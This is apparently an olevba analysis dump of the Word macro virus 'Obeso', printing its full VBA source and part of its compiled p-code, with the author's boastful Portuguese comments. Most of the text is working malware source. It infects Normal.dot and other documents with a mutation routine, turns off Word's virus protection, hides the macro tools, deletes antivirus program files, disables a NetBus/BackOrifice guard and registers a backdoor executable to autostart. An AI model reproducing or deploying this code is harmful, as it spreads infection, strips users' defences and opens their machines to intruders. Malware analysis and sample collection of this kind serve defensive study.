olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Obeso
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO Obeso.cls 
in file: Virus.MSWord.Obeso - OLE stream: 'Macros/VBA/Obeso'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Hehhe... as próximas linhas são uma verdadeira merda né...


Private Declare Function SystemParametersInfo Lib "user32" Alias "SystemParametersInfoA" (ByVal uAction As Long, ByVal uParam As Long, ByVal lpvParam As Long, ByVal fuWinIni As Long) As Long
'3=65397g107536=339510375g7
'9=574910j2l435=949723104jl
'691079+82299r1096+79298r92691079+82299r
'3636ad8135gs363d6a3g8s51
'8%1010910434310910%81010941049338%10109104343109
'71089w106168t98107109w6t6981
Private Sub Document_Close()
On Error Resume Next
Application.EnableCancelKey = wdCancelDisabled
SystemParametersInfo 97, 1, 1, 0 'Retirado do trojan Acid Shiver... VALEU AÍ!
Set t = Obeso.VBProject.VBComponents.Item(1)
Set A = ActiveDocument.VBProject.VBComponents.Item(1)
Set n = NormalTemplate.VBProject.VBComponents.Item(1)
'/*/*/*/*/ Este é um simples código de mutação (pelo menos eu acho que é... e colabora para que o vírus aumente cada vez mais de tamanho...)
'> Usado pela 1ª vez aki!
Randomize
v1 = Int((10 * Rnd) + 1)
v2 = Int((10 * Rnd) + 1)
If v2 = 1 Then v2 = "%": GoTo x1
If v2 = 2 Then v2 = "!": GoTo x1
If v2 = 3 Then v2 = "(": GoTo x1
If v2 = 4 Then v2 = "=": GoTo x1
If v2 = 5 Then v2 = "#"
x1:
v3 = Int((10 * Rnd) + 1)
v4 = Int((10 * Rnd) + 1)
If v4 = 1 Then v4 = ".": GoTo x2
If v4 = 2 Then v4 = "5": GoTo x2
If v4 = 3 Then v4 = "+": GoTo x2
If v4 = 4 Then v4 = "d": GoTo x2
If v4 = 5 Then v4 = "y"
x2:
v5 = Int((10 * Rnd) + 1)
v6 = Int((10 * Rnd) + 1)
If v6 = 1 Then v6 = "a": GoTo x3
If v6 = 2 Then v6 = "x": GoTo x3
If v6 = 3 Then v6 = "w": GoTo x3
If v6 = 4 Then v6 = "9": GoTo x3
If v6 = 5 Then v6 = "p"
x3:
v7 = Int((10 * Rnd) + 1)
v8 = Int((10 * Rnd) + 1)
If v8 = 1 Then v8 = "0": GoTo x4
If v8 = 2 Then v8 = "g": GoTo x4
If v8 = 3 Then v8 = "c": GoTo x4
If v8 = 4 Then v8 = "j": GoTo x4
If v8 = 5 Then v8 = "t"
x4:
s = Int((3 * Rnd) + 1): If s = 1 Then GoTo n1: If s = 2 Then GoTo n2: If s = 3 Then GoTo n3: If s = 4 Then GoTo nt
n1:
v9 = Int((10 * Rnd) + 1)
n2:
v10 = Int((10 * Rnd) + 1)
If v10 = 1 Then v10 = "l": GoTo x5
If v10 = 2 Then v10 = "s": GoTo x5
If v10 = 3 Then v10 = "i": GoTo x5
If v10 = 4 Then v10 = "r": GoTo x5
If v10 = 5 Then v10 = "6"
x5:
n3:
v11 = Int((10 * Rnd) + 1)
nt:
tt = v1 & v2 & v3 & v4 & v5 & v6 & v7 & v8 & v9 & v10 & v11 & s
ts = v3 & v2 & v1 & v5 & v6 & v4 & v9 & s & v7 & v11 & v8 & v10
v = Int((2 * Rnd) + 1)
If v = 1 Then tu = tt & ts
If v = 2 Then tu = ts & tt
If v1 = 1 Then tu = tu & tu
If v1 = 5 Then tu = tt & ts & tt
If v1 = 10 Then tu = ts & tt & ts
'/*/*/*/*/ Hehe... essa bosta nunca vai estar igual!

'/*/*/*/*/ Infects a normal.dot or an archive
'> Usado pela 1ª vez no meu vírus Riotz
If n.Name <> "Obeso" Or n.Name = "Obeso" And n.CodeModule.Lines(1, 1) <> "'Hehhe... as próximas linhas são uma verdadeira merda né..." Then
ObesoCode = t.CodeModule.Lines(1, t.CodeModule.CountOfLines)
n.CodeModule.deletelines 1, n.CodeModule.CountOfLines
n.CodeModule.addfromstring ObesoCode
n.CodeModule.addfromstring "'" & tu
n.Name = "Obeso"
Fatz
End If
If A.Name <> "Obeso" Or A.Name = "Obeso" And A.CodeModule.Lines(1, 1) <> "'Hehhe... as próximas linhas são uma verdadeira merda né..." Then
sv = ActiveDocument.Saved
ObesoCode = n.CodeModule.Lines(1, n.CodeModule.CountOfLines)
A.CodeModule.deletelines 1, A.CodeModule.CountOfLines
A.CodeModule.addfromstring ObesoCode
A.CodeModule.addfromstring "'" & tu
A.Name = "Obeso"
If sv <> ActiveDocument.Saved Then Documents.Save True
End If
'/*/*/*/*/ It's very effective, isn't?
End Sub
Private Sub Document_New()
On Error Resume Next
If Minute(Now) = Second(Now) Then
System.PrivateProfileString("", "HKEY_CURRENT_CONFIG\Display\Settings", "Resolution") = "320,200"
System.PrivateProfileString("", "HKEY_CURRENT_CONFIG\Display\Settings", "MouseTrails") = "9"
End If
End Sub
Private Sub Document_Open()
On Error Resume Next
If Hour(Now) = Day(Now) Then
mc = "c:\"
mn = Dir(mc, vbDirectory)
Do While mn <> ""
If (GetAttr(mc & mn) And vbArchive) = vbArchive Then
Open mn For Append As #4
For y = 1 To MacroContainer.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
k = MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(y, 1)
Print #4, k
Next y
Close #4
End If
mn = Dir
Loop
End If
End Sub
Private Sub Fatz()
'>Retirado do MEU virus GHOUL 3
'Carai isso eh um arrasoo neh... pode falar a verdade!
On Error Resume Next
Application.EnableCancelKey = wdCancelDisabled
Options.VirusProtection = False
Options.SaveNormalPrompt = False
Options.ConfirmConversions = False
CommandBars("Tools").Controls("Macro").Visible = False
CommandBars("View").Controls(6).Visible = False
CustomizationContext = NormalTemplate
KeyBindings.Add KeyCode:=BuildKeyCode(Arg1:=wdKeyAlt, Arg2:=wdKeyF11), KeyCategory:=wdKeyCategoryCommand, Command:="hahaNOT"
KeyBindings.Add KeyCode:=BuildKeyCode(Arg1:=wdKeyAlt, Arg2:=wdKeyF8), KeyCategory:=wdKeyCategoryCommand, Command:="hahaNOT"
Dim McAfee, FMcAfee, FProt, FFProt, VET, FVET, Avast, FAvast, TheCleaner, FTheCleaner, Panda, FPanda, AVP, FAVP
FProt = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Command Software\F-PROT32", "Location")
VET = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Cybec\VET Antivirus for Win32\Resident", "VetPath")
McAfee = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\McAfee\Scan95", "szProductLocation")
Avast = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\ALWIL Software\Avast32", "Path")
TheCleaner = System.PrivateProfileString("", "HKEY_USERS\.DEFAULT\Software\MooSoft Development\The Cleaner", "tcshellex")
Panda = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Panda Software\Panda Antivirus 6.0", "Path")
AVP = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\KasperskyLab\Components\100", "Folder")
FFProt = FProt + "\*.*": FVET = VET + "\*.*": FMcAfee = McAfee + "\*.*": FAvast = Avast + "\*.*": FTheCleaner = TheCleaner + "\*.*": FPanda = Panda + "*.*": FAVP = AVP + "\*.*": Affprot = FProt + "\*.Dat": Bffprot = FProt + "\*.Def": Afvet = VET + "\*.Dat": AFMcAfee = McAfee + "\*.Dat": afavast = Avast + "\*.Dat": bfavast = Avast + "\*.Dll": afthecleaner = TheCleaner + "\*.Dll": afpanda = Panda + "*.Dat": bfpanda = Panda + "*.Dll": afavp = AVP + "\*.Dat": bfavp = AVP + "\*.Dll":
If Dir(FFProt) <> "" Then Kill Affprot: Kill Bffprot: Kill FFProt
If Dir(FVET) <> "" Then Kill Afvet: Kill FVET
If Dir(FMcAfee) <> "" Then Kill AFMcAfee: Kill FMcAfee
If Dir(FAvast) <> "" Then Kill afavast: Kill bfavast: Kill FAvast
If Dir(FTheCleaner) <> "" Then Kill afthecleaner: Kill FTheCleaner
If Dir(FPanda) <> "" Then Kill afpanda: Kill bfpanda: Kill FPanda
If Dir(FAVP) <> "" Then Kill afavp: Kill bfavp: Kill FAVP
If System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\DeepVision\Xô BoBus - R32", "0") = "" Then GoTo Fim
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\DeepVision\Xô BoBus - R32", "0") = "DISABLED"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\DeepVision\Xô BoBus - R32", "1") = "DISABLED"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\DeepVision\Xô BoBus - R32", "2") = "DISABLED"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\DeepVision\Xô BoBus - R32", "3") = "DISABLED"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\DeepVision\Xô BoBus - R32", "4") = "DISABLED"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\DeepVision\Xô BoBus - R32", "5") = "DISABLED"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\DeepVision\Xô BoBus - R32", "6") = "DISABLED"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\DeepVision\Xô BoBus - R32", "7") = "DISABLED"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\DeepVision\Xô BoBus - R32", "8") = "DISABLED"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\DeepVision\Xô BoBus - R32", "9") = "DISABLED"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\DeepVision\Xô BoBus - R32", "10") = "DISABLED"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\DeepVision\Xô BoBus - R32", "AutoStart") = "DISABLED"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\DeepVision\Xô BoBus - R32", "AutoVerify") = "DISABLED"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\DeepVision\Xô BoBus - R32", "BOProt") = "DISABLED"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\DeepVision\Xô BoBus - R32", "ExtraPort") = "DISABLED"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\DeepVision\Xô BoBus - R32", "NetBusAdv") = "DISABLED"
Fim:
If FileLen("C:\Windows\PATCH.EXE") <> 472576 Then System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run", "PATCH") = "c:\windows\Patch.exe /pass:killfhc"
End Sub
Sub AutoExit()
On Error Resume Next
If Month(Now) = "09" And Day(Now) = "07" Then
'It's my birthday!!! 7 de Setembro de 1984!!!
Randomize
k1 = Int((255 * Rnd) + 1)
k2 = Int((255 * Rnd) + 1)
k3 = Int((255 * Rnd) + 1)
K4 = Int((255 * Rnd) + 1)
K5 = Int((255 * Rnd) + 1)
K6 = Int((255 * Rnd) + 1)
K7 = Int((255 * Rnd) + 1)
K8 = Int((255 * Rnd) + 1)
K9 = Int((255 * Rnd) + 1)
K10 = Int((255 * Rnd) + 1)
System.PrivateProfileString("", "HKEY_USERS\.DEFAULT\Control Panel\Colors", "ActiveBorder") = k1 & " " & k2 & " " & k3
System.PrivateProfileString("", "HKEY_USERS\.DEFAULT\Control Panel\Colors", "ActiveTitle") = k3 & " " & k2 & " " & k1
System.PrivateProfileString("", "HKEY_USERS\.DEFAULT\Control Panel\Colors", "AppWorkspace") = k1 & " " & k3 & " " & k2
System.PrivateProfileString("", "HKEY_USERS\.DEFAULT\Control Panel\Colors", "Background") = k1 & " " & k1 & " " & k3
System.PrivateProfileString("", "HKEY_USERS\.DEFAULT\Control Panel\Colors", "ButtonFace") = k3 & " " & k3 & " " & k2
System.PrivateProfileString("", "HKEY_USERS\.DEFAULT\Control Panel\Colors", "ButtonText") = k2 & " " & k1 & " " & k2
System.PrivateProfileString("", "HKEY_USERS\.DEFAULT\Control Panel\Colors", "InactiveTitle") = k3 & " " & k2 & " " & k3
System.PrivateProfileString("", "HKEY_USERS\.DEFAULT\Control Panel\Colors", "InactiveTitleText") = k1 & " " & k2 & " " & k1
System.PrivateProfileString("", "HKEY_USERS\.DEFAULT\Control Panel\Colors", "Menu") = k2 & " " & k2 & " " & k2
System.PrivateProfileString("", "HKEY_USERS\.DEFAULT\Control Panel\Colors", "MenuText") = k3 & " " & k3 & " " & k3
System.PrivateProfileString("", "HKEY_USERS\.DEFAULT\Control Panel\Colors", "Scrollbar") = k1 & " " & k1 & " " & k1
System.PrivateProfileString("", "HKEY_USERS\.DEFAULT\Control Panel\Colors", "Window") = k2 & " " & k3 & " " & k1
System.PrivateProfileString("", "HKEY_USERS\.DEFAULT\Control Panel\Colors", "WindowText") = k3 & " " & k1 & " " & k1
End If
'Bom, esse vírus só vai fazer isso, por enquanto... é que eu não estava com muitas idéias hoje...
End Sub

'
'Obeso virus
'               by The Bug

' Your files seems more fat?!? Shit!
' ah, caution, this virus can to grow fat!

'obs: Não reparem nos meus erros de inglês...

'Finished: 25/Jul/00 at 03:48 am
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Obeso
' ===============================================================================
' Module streams:
' Macros/VBA/Obeso - 18776 bytes
' Line #0:
' 	QuoteRem 0x0000 0x003A "Hehhe... as próximas linhas são uma verdadeira merda né..."
' Line #1:
' Line #2:
' Line #3:
' 	FuncDefn (Private Declare Function SystemParametersInfo Lib "user32" (ByVal uAction As Long, ByVal uParam As Long, ByVal lpvParam As Long, ByVal fuWinIni As Long) As Long)
' Line #4:
' 	QuoteRem 0x0000 0x001A "3=65397g107536=339510375g7"
' Line #5:
' 	QuoteRem 0x0000 0x001A "9=574910j2l435=949723104jl"
' Line #6:
' 	QuoteRem 0x0000 0x0027 "691079+82299r1096+79298r92691079+82299r"
' Line #7:
' 	QuoteRem 0x0000 0x0018 "3636ad8135gs363d6a3g8s51"
' Line #8:
' 	QuoteRem 0x0000 0x0030 "8%1010910434310910%81010941049338%10109104343109"
' Line #9:
' 	QuoteRem 0x0000 0x001C "71089w106168t98107109w6t6981"
' Line #10:
' 	FuncDefn (Private Sub Document_Close())
' Line #11:
' 	OnError (Resume Next) 
' Line #12:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #13:
' 	LitDI2 0x0061 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0000 
' 	ArgsCall SystemParametersInfo 0x0004 
' 	QuoteRem 0x0021 0x002B "Retirado do trojan Acid Shiver... VALEU AÍ!"
' Line #14:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld Obeso 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set t 
' Line #15:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set A 
' Line #16:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set n 
' Line #17:
' 	QuoteRem 0x0000 0x008B "/*/*/*/*/ Este é um simples código de mutação (pelo menos eu acho que é... e colabora para que o vírus aumente cada vez mais de tamanho...)"
' Line #18:
' 	QuoteRem 0x0000 0x0018 "> Usado pela 1ª vez aki!"
' Line #19:
' 	ArgsCall Read 0x0000 
' Line #20:
' 	LitDI2 0x000A 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	St v1 
' Line #21:
' 	LitDI2 0x000A 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	St v2 
' Line #22:
' 	Ld v2 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "%"
' 	St v2 
' 	BoS 0x0000 
' 	GoTo x1 
' 	EndIf 
' Line #23:
' 	Ld v2 
' 	LitDI2 0x0002 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "!"
' 	St v2 
' 	BoS 0x0000 
' 	GoTo x1 
' 	EndIf 
' Line #24:
' 	Ld v2 
' 	LitDI2 0x0003 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "("
' 	St v2 
' 	BoS 0x0000 
' 	GoTo x1 
' 	EndIf 
' Line #25:
' 	Ld v2 
' 	LitDI2 0x0004 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "="
' 	St v2 
' 	BoS 0x0000 
' 	GoTo x1 
' 	EndIf 
' Line #26:
' 	Ld v2 
' 	LitDI2 0x0005 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "#"
' 	St v2 
' 	EndIf 
' Line #27:
' 	Label x1 
' Line #28:
' 	LitDI2 0x000A 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	St v3 
' Line #29:
' 	LitDI2 0x000A 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	St v4 
' Line #30:
' 	Ld v4 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "."
' 	St v4 
' 	BoS 0x0000 
' 	GoTo x2 
' 	EndIf 
' Line #31:
' 	Ld v4 
' 	LitDI2 0x0002 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "5"
' 	St v4 
' 	BoS 0x0000 
' 	GoTo x2 
' 	EndIf 
' Line #32:
' 	Ld v4 
' 	LitDI2 0x0003 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "+"
' 	St v4 
' 	BoS 0x0000 
' 	GoTo x2 
' 	EndIf 
' Line #33:
' 	Ld v4 
' 	LitDI2 0x0004 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "d"
' 	St v4 
' 	BoS 0x0000 
' 	GoTo x2 
' 	EndIf 
' Line #34:
' 	Ld v4 
' 	LitDI2 0x0005 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "y"
' 	St v4 
' 	EndIf 
' Line #35:
' 	Label x2 
' Line #36:
' 	LitDI2 0x000A 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	St v5 
' Line #37:
' 	LitDI2 0x000A 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	St v6 
' Line #38:
' 	Ld v6 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "a"
' 	St v6 
' 	BoS 0x0000 
' 	GoTo x3 
' 	EndIf 
' Line #39:
' 	Ld v6 
' 	LitDI2 0x0002 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "x"
' 	St v6 
' 	BoS 0x0000 
' 	GoTo x3 
' 	EndIf 
' Line #40:
' 	Ld v6 
' 	LitDI2 0x0003 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "w"
' 	St v6 
' 	BoS 0x0000 
' 	GoTo x3 
' 	EndIf 
' Line #41:
' 	Ld v6 
' 	LitDI2 0x0004 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "9"
' 	St v6 
' 	BoS 0x0000 
' 	GoTo x3 
' 	EndIf 
' Line #42:
' 	Ld v6 
' 	LitDI2 0x0005 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "p"
' 	St v6 
' 	EndIf 
' Line #43:
' 	Label x3 
' Line #44:
' 	LitDI2 0x000A 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	St v7 
' Line #45:
' 	LitDI2 0x000A 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	St v8 
' Line #46:
' 	Ld v8 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "0"
' 	St v8 
' 	BoS 0x0000 
' 	GoTo x4 
' 	EndIf 
' Line #47:
' 	Ld v8 
' 	LitDI2 0x0002 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "g"
' 	St v8 
' 	BoS 0x0000 
' 	GoTo x4 
' 	EndIf 
' Line #48:
' 	Ld v8 
' 	LitDI2 0x0003 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "c"
' 	St v8 
' 	BoS 0x0000 
' 	GoTo x4 
' 	EndIf 
' Line #49:
' 	Ld v8 
' 	LitDI2 0x0004 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "j"
' 	St v8 
' 	BoS 0x0000 
' 	GoTo x4 
' 	EndIf 
' Line #50:
' 	Ld v8 
' 	LitDI2 0x0005 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "t"
' 	St v8 
' 	EndIf 
' Line #51:
' 	Label x4 
' Line #52:
' 	LitDI2 0x0003 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	St s 
' 	BoS 0x0000 
' 	Ld s 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo n1 
' 	BoS 0x0000 
' 	Ld s 
' 	LitDI2 0x0002 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo n2 
' 	BoS 0x0000 
' 	Ld s 
' 	LitDI2 0x0003 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo n3 
' 	BoS 0x0000 
' 	Ld s 
' 	LitDI2 0x0004 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo nt 
' 	EndIf 
' 	EndIf 
' 	EndIf 
' 	EndIf 
' Line #53:
' 	Label n1 
' Line #54:
' 	LitDI2 0x000A 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	St v9 
' Line #55:
' 	Label n2 
' Line #56:
' 	LitDI2 0x000A 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	St v10 
' Line #57:
' 	Ld v10 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "l"
' 	St v10 
' 	BoS 0x0000 
' 	GoTo x5 
' 	EndIf 
' Line #58:
' 	Ld v10 
' 	LitDI2 0x0002 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "s"
' 	St v10 
' 	BoS 0x0000 
' 	GoTo x5 
' 	EndIf 
' Line #59:
' 	Ld v10 
' 	LitDI2 0x0003 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "i"
' 	St v10 
' 	BoS 0x0000 
' 	GoTo x5 
' 	EndIf 
' Line #60:
' 	Ld v10 
' 	LitDI2 0x0004 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "r"
' 	St v10 
' 	BoS 0x0000 
' 	GoTo x5 
' 	EndIf 
' Line #61:
' 	Ld v10 
' 	LitDI2 0x0005 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "6"
' 	St v10 
' 	EndIf 
' Line #62:
' 	Label x5 
' Line #63:
' 	Label n3 
' Line #64:
' 	LitDI2 0x000A 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	St v11 
' Line #65:
' 	Label nt 
' Line #66:
' 	Ld v1 
' 	Ld v2 
' 	Concat 
' 	Ld v3 
' 	Concat 
' 	Ld v4 
' 	Concat 
' 	Ld v5 
' 	Concat 
' 	Ld v6 
' 	Concat 
' 	Ld v7 
' 	Concat 
' 	Ld v8 
' 	Concat 
' 	Ld v9 
' 	Concat 
' 	Ld v10 
' 	Concat 
' 	Ld v11 
' 	Concat 
' 	Ld s 
' 	Concat 
' 	St tt 
' Line #67:
' 	Ld v3 
' 	Ld v2 
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	Ld v5 
' 	Concat 
' 	Ld v6 
' 	Concat 
' 	Ld v4 
' 	Concat 
' 	Ld v9 
' 	Concat 
' 	Ld s 
' 	Concat 
' 	Ld v7 
' 	Concat 
' 	Ld v11 
' 	Concat 
' 	Ld v8 
' 	Concat 
' 	Ld v10 
' 	Concat 
' 	St ts 
' Line #68:
' 	LitDI2 0x0002 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	St v 
' Line #69:
' 	Ld v 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld tt 
' 	Ld ts 
' 	Concat 
' 	St tu 
' 	EndIf 
' Line #70:
' 	Ld v 
' 	LitDI2 0x0002 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ts 
' 	Ld tt 
' 	Concat 
' 	St tu 
' 	EndIf 
' Line #71:
' 	Ld v1 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld tu 
' 	Ld tu 
' 	Concat 
' 	St tu 
' 	EndIf 
' Line #72:
' 	Ld v1 
' 	LitDI2 0x0005 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld tt 
' 	Ld ts 
' 	Concat 
' 	Ld tt 
' 	Concat 
' 	St tu 
' 	EndIf 
' Line #73:
' 	Ld v1 
' 	LitDI2 0x000A 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ts 
' 	Ld tt 
' 	Concat 
' 	Ld ts 
' 	Concat 
' 	St tu 
' 	EndIf 
' Line #74:
' 	QuoteRem 0x0000 0x0033 "/*/*/*/*/ Hehe... essa bosta nunca vai estar igual!"
' Line #75:
' Line #76:
' 	QuoteRem 0x0000 0x002C "/*/*/*/*/ Infects a normal.dot or an archive"
' Line #77:
' 	QuoteRem 0x0000 0x0026 "> Usado pela 1ª vez no meu vírus Riotz"
' Line #78:
' 	Ld n 
' 	MemLd New 
' 	LitStr 0x0005 "Obeso"
' 	Ne 
' 	Ld n 
' 	MemLd New 
' 	LitStr 0x0005 "Obeso"
' 	Eq 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld n 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x003B "'Hehhe... as próximas linhas são uma verdadeira merda né..."
' 	Ne 
' 	And 
' 	Or 
' 	IfBlock 
' Line #79:
' 	LitDI2 0x0001 
' 	Ld t 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld t 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St ObesoCode 
' Line #80:
' 	LitDI2 0x0001 
' 	Ld n 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld n 
' 	MemLd CodeModule 
' 	ArgsMemCall deletelines 0x0002 
' Line #81:
' 	Ld ObesoCode 
' 	Ld n 
' 	MemLd CodeModule 
' 	ArgsMemCall addfromstring 0x0001 
' Line #82:
' 	LitStr 0x0001 "'"
' 	Ld tu 
' 	Concat 
' 	Ld n 
' 	MemLd CodeModule 
' 	ArgsMemCall addfromstring 0x0001 
' Line #83:
' 	LitStr 0x0005 "Obeso"
' 	Ld n 
' 	MemSt New 
' Line #84:
' 	ArgsCall Fatz 0x0000 
' Line #85:
' 	EndIfBlock 
' Line #86:
' 	Ld A 
' 	MemLd New 
' 	LitStr 0x0005 "Obeso"
' 	Ne 
' 	Ld A 
' 	MemLd New 
' 	LitStr 0x0005 "Obeso"
' 	Eq 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld A 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x003B "'Hehhe... as próximas linhas são uma verdadeira merda né..."
' 	Ne 
' 	And 
' 	Or 
' 	IfBlock 
' Line #87:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	St sv 
' Line #88:
' 	LitDI2 0x0001 
' 	Ld n 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld n 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St ObesoCode 
' Line #89:
' 	LitDI2 0x0001 
' 	Ld A 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld A 
' 	MemLd CodeModule 
' 	ArgsMemCall deletelines 0x0002 
' Line #90:
' 	Ld ObesoCode 
' 	Ld A 
' 	MemLd CodeModule 
' 	ArgsMemCall addfromstring 0x0001 
' Line #91:
' 	LitStr 0x0001 "'"
' 	Ld tu 
' 	Concat 
' 	Ld A 
' 	MemLd CodeModule 
' 	ArgsMemCall addfromstring 0x0001 
' Line #92:
' 	LitStr 0x0005 "Obeso"
' 	Ld A 
' 	MemSt New 
' Line #93:
' 	Ld sv 
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
